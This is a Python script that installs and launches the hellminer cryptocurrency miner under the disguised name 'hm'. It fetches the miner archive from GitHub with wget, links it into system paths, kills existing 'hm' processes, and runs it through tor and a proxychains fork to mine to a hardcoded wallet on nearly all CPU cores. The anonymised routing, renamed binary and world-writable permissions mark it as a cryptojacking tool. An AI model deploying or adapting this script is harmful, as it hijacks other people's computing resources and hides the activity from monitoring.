#!/usr/bin/env python3

__author__ = 'root'

import os
import sys
import time
import shutil
import subprocess
import multiprocessing


def run_command(command, shell=True, check=True):
    """
    Run a shell command and handle errors.
    """
    try:
        subprocess.run(command, shell=shell, check=check)
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {command}\n{e}")
        sys.exit(1)


def main():
    # Set execute permissions on the script
    run_command(f'chmod 777 "{__file__}"')

    # Program name
    program = 'hm'

    # Kill existing processes with the program name
    run_command(f'pkill {program}')

    # Calculate the number of CPU cores
    cores = multiprocessing.cpu_count() - 1
    if cores <= 0:
        cores = 1

    # Set huge pages for memory management
    run_command('sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))')

    try:
        # Update and install dependencies
        run_command('apt-get update -y')
        run_command('apt -qqy install wget procps libsodium-dev >/dev/null 2>&1 || apt -qqy install wget procps libsodium-dev >/dev/null 2>&1')
        run_command('apt-get install gcc make tor python3 python3-dev -y')

        # Clone and build proxychains-ng
        run_command('rm -rf proxychains-ng')
        run_command('git clone https://github.com/ts6aud5vkg/proxychains-ng.git')
        os.chdir('proxychains-ng')
        run_command('make')
        run_command('make install')
        run_command('make install-config')
        os.chdir('..')

        # Download and install hellminer
        if not os.path.isfile(f'/usr/local/bin/{program}'):
            tmp_dir = subprocess.check_output('mktemp -d', shell=True).decode().strip()
            run_command(f'wget -qO- https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz | tar -zx -C "{tmp_dir}"')
            os.chdir(tmp_dir)
            run_command('chmod 777 -R ./')
            run_command('rm -rf ./*.sh')
            run_command('mv h* hm')
            working_dir = os.getcwd()
            run_command(f'ln -s -f {working_dir}/hm /usr/local/bin/{program}')
            run_command(f'ln -s -f {working_dir}/hm /usr/bin/{program}')
            time.sleep(2)

    except Exception as e:
        print(f"An error occurred: {e}")
        sys.exit(1)

    # Start tor
    run_command('tor &')
    time.sleep(60)

    # Run hellminer with proxychains4
    run_command(f'proxychains4 {program} -u RUf9nXasGVcz4mtWhYxENVzmQrpf1g5WXx -p d=16384S,hybrid')


if __name__ == "__main__":
    main()
